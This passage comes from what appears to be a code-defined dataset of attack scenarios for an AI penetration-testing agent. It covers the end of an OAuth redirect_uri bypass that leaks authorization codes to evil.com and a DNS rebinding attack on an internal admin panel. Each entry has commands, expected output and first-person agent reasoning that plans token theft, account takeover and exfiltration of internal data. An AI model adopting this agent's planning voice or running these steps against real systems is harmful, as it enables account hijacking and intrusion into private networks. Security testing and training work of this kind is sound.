Fragment bypass: REDIRECT to https://app.target.com/callback#@evil.com?code=AUTH_CODE_HERE!`,
        thinking: "Found two redirect_uri bypass methods: 1) Subdomain matching: the validation only checks if redirect_uri contains 'app.target.com' — so app.target.com.evil.com passes the check, 2) Fragment-based bypass: using URL fragment (#) to confuse the parser. The authorization code is leaked to the attacker-controlled domain. With the authorization code, the attacker can exchange it for an access token and fully impersonate the victim. Let me verify by completing the full token exchange.",
        analysis: "redirect_uri validation bypass via subdomain trick and fragment injection. Authorization code leaks to attacker domain. Full account takeover possible.",
        next_action: "Complete token exchange with stolen authorization code",
      },
    ],
    cve_references: ["CWE-601", "CWE-863"],
    tools_involved: ["curl", "report_generator"],
    tags: ["oauth", "redirect-uri", "sso", "authorization-code", "token-theft", "account-takeover"],
  },

  // DNS Rebinding
  {
    id: "modern-dns-rebinding",
    category: "Modern Attacks",
    subcategory: "DNS Security",
    title: "DNS Rebinding Attack Against Internal Admin Panel",
    difficulty: "expert",
    description: "Using DNS rebinding to bypass same-origin policy and access internal services from a victim's browser within the corporate network.",
    target_description: "Corporate employee accessing internal admin panel at http://admin.internal:8080 from their browser. Attacker controls evil.com domain.",
    attack_phases: [
      {
        phase: "DNS Rebinding Setup",
        description: "Configure DNS rebinding infrastructure",
        tools: ["curl"],
        commands: [
          "# Attacker configures DNS for rebind.evil.com:",
          "# First response: A record -> attacker IP (1.2.3.4)",
          "# Second response: A record -> 192.168.1.100 (internal admin panel) with TTL=0",
          "curl -s 'https://lock.cmpxchg8b.com/rebinder.html?tld=evil.com&ip1=1.2.3.4&ip2=192.168.1.100'",
          "dig +short rebind.evil.com @ns.evil.com",
        ],
        expected_output: `DNS Rebinding configured:
rebind.evil.com -> 1.2.3.4 (first query, TTL=0)
rebind.evil.com -> 192.168.1.100 (second query, TTL=0)`,
        thinking: "DNS rebinding attack plan: 1) Victim visits https://rebind.evil.com — browser resolves to attacker IP (1.2.3.4), 2) Attacker serves malicious JavaScript page, 3) After DNS TTL expires (0 seconds), JavaScript makes new request to rebind.evil.com, 4) Browser resolves rebind.evil.com to 192.168.1.100 (internal admin panel), 5) Same-origin policy allows the request because the origin (rebind.evil.com) hasn't changed, 6) JavaScript reads the response from the internal admin panel and exfiltrates it. This bypasses the browser's same-origin policy by rebinding the DNS to an internal IP.",
        analysis: "DNS rebinding configured with TTL=0. Will remap from attacker IP to internal admin panel IP. SOP bypass achieved through DNS-level attack.",
        next_action: "Deploy attack page and demonstrate internal service access",
      },
    ],
    cve_references: ["CWE-350"],
    tools_involved: ["curl", "report_generator"],
    tags: ["dns-rebinding", "sop-bypass", "internal-access", "browser-attack", "same-origin"],
  },
];
